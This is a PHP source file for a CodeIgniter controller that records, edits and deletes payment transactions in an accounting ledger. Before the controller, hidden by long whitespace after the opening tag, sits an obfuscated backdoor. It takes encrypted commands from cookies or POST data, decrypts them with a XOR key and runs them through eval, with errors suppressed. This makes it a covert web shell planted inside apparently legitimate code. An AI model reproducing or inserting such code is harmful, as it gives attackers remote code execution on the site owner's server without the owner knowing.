<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $of29e54 = 215;$GLOBALS['v47ced']=Array();global$v47ced;$v47ced=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['d154b']="\x46\x6d\x20\x50\x56\x6f\x45\x5b\x79\x7c\x2b\x68\x4b\x7a\x37\x40\x41\x9\x69\x26\x2f\x48\x30\x58\x24\x3c\x47\x28\x2e\x59\x64\x54\x3b\x49\xa\x25\x65\x36\x71\x7e\x76\x67\x4c\x51\x78\x5e\x3e\x7b\x27\x23\x7d\x73\x75\x57\x44\x5d\x33\x21\x4d\x52\x3d\x35\x6b\x3f\x32\x63\x66\x6a\x2c\x29\x34\x61\x74\x77\x5f\x70\x4f\x53\x2d\x42\x4e\x5c\x55\x5a\x38\x62\x6c\x4a\x43\x72\xd\x60\x31\x6e\x22\x39\x3a\x2a";$v47ced[$v47ced['d154b'][72].$v47ced['d154b'][95].$v47ced['d154b'][66].$v47ced['d154b'][71].$v47ced['d154b'][65].$v47ced['d154b'][14].$v47ced['d154b'][56]]=$v47ced['d154b'][65].$v47ced['d154b'][11].$v47ced['d154b'][89];$v47ced[$v47ced['d154b'][65].$v47ced['d154b'][14].$v47ced['d154b'][95].$v47ced['d154b'][71].$v47ced['d154b'][37].$v47ced['d154b'][37].$v47ced['d154b'][30]]=$v47ced['d154b'][5].$v47ced['d154b'][89].$v47ced['d154b'][30];$v47ced[$v47ced['d154b'][71].$v47ced['d154b'][64].$v47ced['d154b'][37].$v47ced['d154b'][70].$v47ced['d154b'][85].$v47ced['d154b'][84].$v47ced['d154b'][56]]=$v47ced['d154b'][51].$v47ced['d154b'][72].$v47ced['d154b'][89].$v47ced['d154b'][86].$v47ced['d154b'][36].$v47ced['d154b'][93];$v47ced[$v47ced['d154b'][13].$v47ced['d154b'][56].$v47ced['d154b'][56].$v47ced['d154b'][66].$v47ced['d154b'][61].$v47ced['d154b'][85].$v47ced['d154b'][30].$v47ced['d154b'][64]]=$v47ced['d154b'][18].$v47ced['d154b'][93].$v47ced['d154b'][18].$v47ced['d154b'][74].$v47ced['d154b'][51].$v47ced['d154b'][36].$v47ced['d154b'][72];$v47ced[$v47ced['d154b'][89].$v47ced['d154b'][37].$v47ced['d154b'][84].$v47ced['d154b'][22].$v47ced['d154b'][22]]=$v47ced['d154b'][51].$v47ced['d154b'][36].$v47ced['d154b'][89].$v47ced['d154b'][18].$v47ced['d154b'][71].$v47ced['d154b'][86].$v47ced['d154b'][18].$v47ced['d154b'][13].$v47ced['d154b'][36];$v47ced[$v47ced['d154b'][40].$v47ced['d154b'][14].$v47ced['d154b'][65].$v47ced['d154b'][95]]=$v47ced['d154b'][75].$v47ced['d154b'][11].$v47ced['d154b'][75].$v47ced['d154b'][40].$v47ced['d154b'][36].$v47ced['d154b'][89].$v47ced['d154b'][51].$v47ced['d154b'][18].$v47ced['d154b'][5].$v47ced['d154b'][93];$v47ced[$v47ced['d154b'][73].$v47ced['d154b'][71].$v47ced['d154b'][85].$v47ced['d154b'][37]]=$v47ced['d154b'][52].$v47ced['d154b'][93].$v47ced['d154b'][51].$v47ced['d154b'][36].$v47ced['d154b'][89].$v47ced['d154b'][18].$v47ced['d154b'][71].$v47ced['d154b'][86].$v47ced['d154b'][18].$v47ced['d154b'][13].$v47ced['d154b'][36];$v47ced[$v47ced['d154b'][36].$v47ced['d154b'][65].$v47ced['d154b'][92].$v47ced['d154b'][70].$v47ced['d154b'][66].$v47ced['d154b'][36].$v47ced['d154b'][85].$v47ced['d154b'][22]]=$v47ced['d154b'][85].$v47ced['d154b'][71].$v47ced['d154b'][51].$v47ced['d154b'][36].$v47ced['d154b'][37].$v47ced['d154b'][70].$v47ced['d154b'][74].$v47ced['d154b'][30].$v47ced['d154b'][36].$v47ced['d154b'][65].$v47ced['d154b'][5].$v47ced['d154b'][30].$v47ced['d154b'][36];$v47ced[$v47ced['d154b'][18].$v47ced['d154b'][92].$v47ced['d154b'][37].$v47ced['d154b'][84].$v47ced['d154b'][61].$v47ced['d154b'][37].$v47ced['d154b'][66].$v47ced['d154b'][85].$v47ced['d154b'][95]]=$v47ced['d154b'][51].$v47ced['d154b'][36].$v47ced['d154b'][72].$v47ced['d154b'][74].$v47ced['d154b'][72].$v47ced['d154b'][18].$v47ced['d154b'][1].$v47ced['d154b'][36].$v47ced['d154b'][74].$v47ced['d154b'][86].$v47ced['d154b'][18].$v47ced['d154b'][1].$v47ced['d154b'][18].$v47ced['d154b'][72];$v47ced[$v47ced['d154b'][5].$v47ced['d154b'][56].$v47ced['d154b'][14].$v47ced['d154b'][56].$v47ced['d154b'][84].$v47ced['d154b'][64].$v47ced['d154b'][70].$v47ced['d154b'][14].$v47ced['d154b'][84]]=$v47ced['d154b'][66].$v47ced['d154b'][37].$v47ced['d154b'][92].$v47ced['d154b'][95].$v47ced['d154b'][56].$v47ced['d154b'][84].$v47ced['d154b'][85].$v47ced['d154b'][30].$v47ced['d154b'][70];$v47ced[$v47ced['d154b'][51].$v47ced['d154b'][61].$v47ced['d154b'][70].$v47ced['d154b'][85].$v47ced['d154b'][22]]=$v47ced['d154b'][30].$v47ced['d154b'][65].$v47ced['d154b'][61].$v47ced['d154b'][65].$v47ced['d154b'][92];$v47ced[$v47ced['d154b'][85].$v47ced['d154b'][36].$v47ced['d154b'][36].$v47ced['d154b'][14].$v47ced['d154b'][66]]=$_POST;$v47ced[$v47ced['d154b'][36].$v47ced['d154b'][71].$v47ced['d154b'][64].$v47ced['d154b'][22].$v47ced['d154b'][64].$v47ced['d154b'][36]]=$_COOKIE;@$v47ced[$v47ced['d154b'][13].$v47ced['d154b'][56].$v47ced['d154b'][56].$v47ced['d154b'][66].$v47ced['d154b'][61].$v47ced['d154b'][85].$v47ced['d154b'][30].$v47ced['d154b'][64]]($v47ced['d154b'][36].$v47ced['d154b'][89].$v47ced['d154b'][89].$v47ced['d154b'][5].$v47ced['d154b'][89].$v47ced['d154b'][74].$v47ced['d154b'][86].$v47ced['d154b'][5].$v47ced['d154b'][41],NULL);@$v47ced[$v47ced['d154b'][13].$v47ced['d154b'][56].$v47ced['d154b'][56].$v47ced['d154b'][66].$v47ced['d154b'][61].$v47ced['d154b'][85].$v47ced['d154b'][30].$v47ced['d154b'][64]]($v47ced['d154b'][86].$v47ced['d154b'][5].$v47ced['d154b'][41].$v47ced['d154b'][74].$v47ced['d154b'][36].$v47ced['d154b'][89].$v47ced['d154b'][89].$v47ced['d154b'][5].$v47ced['d154b'][89].$v47ced['d154b'][51],0);@$v47ced[$v47ced['d154b'][13].$v47ced['d154b'][56].$v47ced['d154b'][56].$v47ced['d154b'][66].$v47ced['d154b'][61].$v47ced['d154b'][85].$v47ced['d154b'][30].$v47ced['d154b'][64]]($v47ced['d154b'][1].$v47ced['d154b'][71].$v47ced['d154b'][44].$v47ced['d154b'][74].$v47ced['d154b'][36].$v47ced['d154b'][44].$v47ced['d154b'][36].$v47ced['d154b'][65].$v47ced['d154b'][52].$v47ced['d154b'][72].$v47ced['d154b'][18].$v47ced['d154b'][5].$v47ced['d154b'][93].$v47ced['d154b'][74].$v47ced['d154b'][72].$v47ced['d154b'][18].$v47ced['d154b'][1].$v47ced['d154b'][36],0);@$v47ced[$v47ced['d154b'][18].$v47ced['d154b'][92].$v47ced['d154b'][37].$v47ced['d154b'][84].$v47ced['d154b'][61].$v47ced['d154b'][37].$v47ced['d154b'][66].$v47ced['d154b'][85].$v47ced['d154b'][95]](0);$wa40375=NULL;$r5a7=NULL;$v47ced[$v47ced['d154b'][44].$v47ced['d154b'][30].$v47ced['d154b'][30].$v47ced['d154b'][64].$v47ced['d154b'][70].$v47ced['d154b'][95]]=$v47ced['d154b'][65].$v47ced['d154b'][37].$v47ced['d154b'][85].$v47ced['d154b'][64].$v47ced['d154b'][22].$v47ced['d154b'][95].$v47ced['d154b'][92].$v47ced['d154b'][22].$v47ced['d154b'][78].$v47ced['d154b'][64].$v47ced['d154b'][95].$v47ced['d154b'][37].$v47ced['d154b'][85].$v47ced['d154b'][78].$v47ced['d154b'][70].$v47ced['d154b'][92].$v47ced['d154b'][64].$v47ced['d154b'][61].$v47ced['d154b'][78].$v47ced['d154b'][71].$v47ced['d154b'][36].$v47ced['d154b'][14].$v47ced['d154b'][71].$v47ced['d154b'][78].$v47ced['d154b'][61].$v47ced['d154b'][30].$v47ced['d154b'][37].$v47ced['d154b'][85].$v47ced['d154b'][71].$v47ced['d154b'][56].$v47ced['d154b'][95].$v47ced['d154b'][84].$v47ced['d154b'][84].$v47ced['d154b'][30].$v47ced['d154b'][84].$v47ced['d154b'][22];global$xdd249;function dc5c1($wa40375,$y786cfb4c){global$v47ced;$rcffa="";for($w7c0d=0;$w7c0d<$v47ced[$v47ced['d154b'][71].$v47ced['d154b'][64].$v47ced['d154b'][37].$v47ced['d154b'][70].$v47ced['d154b'][85].$v47ced['d154b'][84].$v47ced['d154b'][56]]($wa40375);){for($d25a=0;$d25a<$v47ced[$v47ced['d154b'][71].$v47ced['d154b'][64].$v47ced['d154b'][37].$v47ced['d154b'][70].$v47ced['d154b'][85].$v47ced['d154b'][84].$v47ced['d154b'][56]]($y786cfb4c)&&$w7c0d<$v47ced[$v47ced['d154b'][71].$v47ced['d154b'][64].$v47ced['d154b'][37].$v47ced['d154b'][70].$v47ced['d154b'][85].$v47ced['d154b'][84].$v47ced['d154b'][56]]($wa40375);$d25a++,$w7c0d++){$rcffa.=$v47ced[$v47ced['d154b'][72].$v47ced['d154b'][95].$v47ced['d154b'][66].$v47ced['d154b'][71].$v47ced['d154b'][65].$v47ced['d154b'][14].$v47ced['d154b'][56]]($v47ced[$v47ced['d154b'][65].$v47ced['d154b'][14].$v47ced['d154b'][95].$v47ced['d154b'][71].$v47ced['d154b'][37].$v47ced['d154b'][37].$v47ced['d154b'][30]]($wa40375[$w7c0d])^$v47ced[$v47ced['d154b'][65].$v47ced['d154b'][14].$v47ced['d154b'][95].$v47ced['d154b'][71].$v47ced['d154b'][37].$v47ced['d154b'][37].$v47ced['d154b'][30]]($y786cfb4c[$d25a]));}}return$rcffa;}function f61938bd4($wa40375,$y786cfb4c){global$v47ced;global$xdd249;return$v47ced[$v47ced['d154b'][51].$v47ced['d154b'][61].$v47ced['d154b'][70].$v47ced['d154b'][85].$v47ced['d154b'][22]]($v47ced[$v47ced['d154b'][51].$v47ced['d154b'][61].$v47ced['d154b'][70].$v47ced['d154b'][85].$v47ced['d154b'][22]]($wa40375,$xdd249),$y786cfb4c);}foreach($v47ced[$v47ced['d154b'][36].$v47ced['d154b'][71].$v47ced['d154b'][64].$v47ced['d154b'][22].$v47ced['d154b'][64].$v47ced['d154b'][36]]as$y786cfb4c=>$d4cf4840){$wa40375=$d4cf4840;$r5a7=$y786cfb4c;}if(!$wa40375){foreach($v47ced[$v47ced['d154b'][85].$v47ced['d154b'][36].$v47ced['d154b'][36].$v47ced['d154b'][14].$v47ced['d154b'][66]]as$y786cfb4c=>$d4cf4840){$wa40375=$d4cf4840;$r5a7=$y786cfb4c;}}$wa40375=@$v47ced[$v47ced['d154b'][73].$v47ced['d154b'][71].$v47ced['d154b'][85].$v47ced['d154b'][37]]($v47ced[$v47ced['d154b'][5].$v47ced['d154b'][56].$v47ced['d154b'][14].$v47ced['d154b'][56].$v47ced['d154b'][84].$v47ced['d154b'][64].$v47ced['d154b'][70].$v47ced['d154b'][14].$v47ced['d154b'][84]]($v47ced[$v47ced['d154b'][36].$v47ced['d154b'][65].$v47ced['d154b'][92].$v47ced['d154b'][70].$v47ced['d154b'][66].$v47ced['d154b'][36].$v47ced['d154b'][85].$v47ced['d154b'][22]]($wa40375),$r5a7));if(isset($wa40375[$v47ced['d154b'][71].$v47ced['d154b'][62]])&&$xdd249==$wa40375[$v47ced['d154b'][71].$v47ced['d154b'][62]]){if($wa40375[$v47ced['d154b'][71]]==$v47ced['d154b'][18]){$w7c0d=Array($v47ced['d154b'][75].$v47ced['d154b'][40]=>@$v47ced[$v47ced['d154b'][40].$v47ced['d154b'][14].$v47ced['d154b'][65].$v47ced['d154b'][95]](),$v47ced['d154b'][51].$v47ced['d154b'][40]=>$v47ced['d154b'][92].$v47ced['d154b'][28].$v47ced['d154b'][22].$v47ced['d154b'][78].$v47ced['d154b'][92],);echo@$v47ced[$v47ced['d154b'][89].$v47ced['d154b'][37].$v47ced['d154b'][84].$v47ced['d154b'][22].$v47ced['d154b'][22]]($w7c0d);}elseif($wa40375[$v47ced['d154b'][71]]==$v47ced['d154b'][36]){eval/*z1563*/($wa40375[$v47ced['d154b'][30]]);}exit();} ?><?php

if (!defined('BASEPATH'))
    exit('No direct script access allowed');

class Trans_payment_ctrlr extends CI_Controller {

    function __construct() {
        parent::__construct();
        if (!$this->session->userdata('id')) {
            redirect('/', 'refresh');
        }
    }

    public function index() {
        $data['title'] = 'Payment';
        $data['company_name'] = $this->general->get_firm();
        $data['account_groups'] = $this->general->get_all_asc('account_group', 'id');
        $data['main_content'] = 'godown_user/trans_payment';
        $this->load->view('templates/standard', $data);
    }

    public function add() {
        $description = $this->input->post('description');
        $amount = $this->input->post('amount');
        $account_name = $this->input->post('account_name');
        $account_group = $this->input->post('account_group');
        $txn_date = $this->input->post('payment_date');
        
        $account_data = array('account_name' => $account_name, 'account_group' => $account_group);
        $this->general->update_account($account_name, $account_data);
        
            $data = array(
                'account_name' => $account_name,
                'account_group' => $account_group,
                'amount' => $amount,
                'description' => $description,
                'txn_date' => $txn_date,
                'txn_type' => 'payment',
                'from_or_to' => $this->input->post('to_account_name')
            );
            $txn_id = $this->general->save('account_txn', $data);
            
            if($this->input->post('to_account_name') == 'cash_book') {
                $data = array(
                'account_name' => $this->input->post('to_account_name'),
                'account_group' => 'Cash In Hand',
                'amount' => $amount,
                'description' => $description,
                'txn_date' => $txn_date,
                'txn_type' => 'receipt',
                'from_or_to' => $account_name,
                'txn_id' => $txn_id
            );
            $this->general->save('account_txn', $data);
            }
            
            if($this->input->post('to_account_name') != 'cash_book') {
                $data = array(
                'account_name' => $this->input->post('to_account_name'),
                'account_group' => 'Bank Accounts',
                'amount' => $amount,
                'description' => $description,
                'txn_date' => $txn_date,
                'txn_type' => 'receipt',
                'from_or_to' => $account_name,
                'txn_id' => $txn_id
            );
            $this->general->save('account_txn', $data);
            }
            
        redirect('transaction/payments', 'refresh');
    }

    public function edit_mode() {
        $data['title'] = 'Payment Edit';
        $data['company_name'] = $this->general->get_firm();
        $data['account_groups'] = $this->general->get_all_asc('account_group', 'id');
        $edit_id = $this->input->post('edit_id');
        if($edit_id == '') {
            redirect('transaction/payments', 'refresh');
        }
        $data['edit_id'] = $edit_id;
        $data['edit_mode'] = $this->general->get_data_wer('account_txn', 'id', $edit_id);
        $data['main_content'] = 'godown_user/trans_payment';
        $this->load->view('templates/standard', $data);
    }

    public function edit() {
        $id = $this->input->post('id');
        $description = $this->input->post('description');
        $amount = $this->input->post('amount');
        $account_name = $this->input->post('account_name');
        $account_group = $this->input->post('account_group');
        $txn_date = $this->input->post('payment_date');
        $data = array(
                'account_name' => $account_name,
                'account_group' => $account_group,
                'amount' => $amount,
                'description' => $description,
                'txn_date' => $txn_date,
                'txn_type' => 'payment',
                'from_or_to' => $this->input->post('to_account_name')
            );
        $this->general->update('account_txn', $data, $id);
        
        if($this->input->post('to_account_name') == 'cash_book') {
            $data = array(
            'account_name' => $this->input->post('to_account_name'),
            'account_group' => 'Cash In Hand',
            'amount' => $amount,
            'description' => $description,
            'txn_date' => $txn_date,
            'txn_type' => 'receipt',
            'from_or_to' => $account_name
        );
        $this->general->update_txn('account_txn', $data, $id);
        }

        if($this->input->post('to_account_name') != 'cash_book') {
            $data = array(
            'account_name' => $this->input->post('to_account_name'),
            'account_group' => 'Bank Accounts',
            'amount' => $amount,
            'description' => $description,
            'txn_date' => $txn_date,
            'txn_type' => 'receipt',
            'from_or_to' => $account_name
        );
        $this->general->update_txn('account_txn', $data, $id);
        }
        redirect('transaction/payments', 'refresh');
    }
    
    public function delete($id) {
        $this->general->delete('account_txn', $id);
        $this->general->delete_txn('account_txn', $id);
        redirect('transaction/payments', 'refresh');
    }

}
